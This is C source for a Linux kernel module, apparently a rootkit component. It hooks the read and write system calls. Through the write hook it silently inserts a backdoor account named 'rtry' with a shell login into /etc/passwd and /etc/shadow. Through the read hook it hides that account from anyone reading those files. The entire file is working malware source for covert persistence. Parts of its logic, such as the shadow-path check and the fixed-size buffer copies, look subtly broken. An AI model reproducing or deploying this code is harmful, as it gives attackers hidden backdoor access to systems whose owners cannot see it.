//allows us to perform certain kernel-level operations, such as printk
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
//processes directory
#include <linux/proc_fs.h>
#include <linux/types.h>


extern asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
extern asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
static char *passwd = "/etc/passwd";
static char *shadow = "/etc/shadow";


/*
 * hijacked_write : hooks the write syscall to add the backdoor account
 *		   to the \etc\passwd file and \etc\shadow file
 * fd : file descriptor
 * buf : user buffer containing data to be written to files
 * count : number of bytes to be written to file
 */
asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
{
	char *kbuf = NULL, *path = NULL,*str = NULL;
	struct file *f = fget(fd);
	int path_len;
	long num_writes = real_write(fd, buf, count); 
	if ( num_writes < 0)
		goto out;
	if(f == NULL) {
		goto out;
	}
	const char *name = ((f->f_path).dentry->d_name).name;
	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
		goto out;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_writes = -ENOMEM;
		goto out;
	}
  	/* get the file name */
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	path_len = strlen(path);

	/* check if the opened file is passwd or shadow file */
	if(strstr(path, passwd) != NULL)
		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
	else if(strstr(path, shadow) != path)
		str = "rtry:!:17128:0:99999:7:::\n";
	if(str != NULL && count != 0) {
		/* copy user buf data into the temporary buffer kbuf */
		copy_from_user(kbuf,buf,PAGE_SIZE);
		/* 
		 *the write syscall requires use buffer, 
		 *so copy the str into user buffer buf
		 */
		copy_to_user(buf,str,strlen(str));
		real_write(fd,buf,strlen(str));
		/*revert the user buffer to its original state */
		copy_to_user(buf,kbuf,PAGE_SIZE);
	}
	
out:
	if(kbuf != NULL)
		kfree(kbuf);
	return num_writes;
}


/*
 * hijacked_read : hooks the read syscall to hide the backdoor account
 *		  from the \etc\passwd file and \etc\shadow file
 * fd : file descriptor
 * buf : user buffer for read data to be written into
 * count : number of bytes to be read from file
 */
asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t count)
{
	char *kbuf = NULL, *path = NULL, *buf = NULL;
	long num_reads = real_read(fd,userbuf, count); 
	struct file *f = fget(fd);
	char *str = NULL ,*try = NULL;
	int len1 = 0, len = 0;

	if ( num_reads <= 0)
		goto out;
	if(f == NULL) {
		goto out;
	}
	const char *name = ((f->f_path).dentry->d_name).name;
	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
		goto out;
	printk("name: %s\n", name);
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	/* check if the open file is passwd or shadow file */
	if(strstr(path,passwd) != NULL) 
		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
	else if(strstr(path,shadow) != NULL)
		str = "rtry:!:17128:0:99999:7:::\n";
	/* removes the backdoor account from the files  */
	if(str != NULL) {
		buf = kmalloc(num_reads, GFP_KERNEL);
		if(buf == NULL){
			num_reads= -ENOMEM;
			goto out;
		}
		/* copy the user buffer into kernel space */
		if(copy_from_user(buf,userbuf,strlen(userbuf))!=0){
			goto out;
		}
		/* get pointer to backdoor account */
		try = strnstr(buf,str,num_reads);
		/* if present, remove the backdoor account from buffer */
		if(try != NULL) {
			len = strlen(str);	
			len1 = (buf + num_reads) - (try + len);
			memmove(try, try+len,len1);
			copy_to_user(userbuf,buf,num_reads - len);
		}
	}
out:
	if(buf != NULL)
		kfree(buf);
	if(kbuf != NULL) {
		kfree(kbuf);
	}
	/*
	 * return the number of bytes read from the file - 
	 * the length of bacckdoor account string
	 */
	return num_reads - len;
}
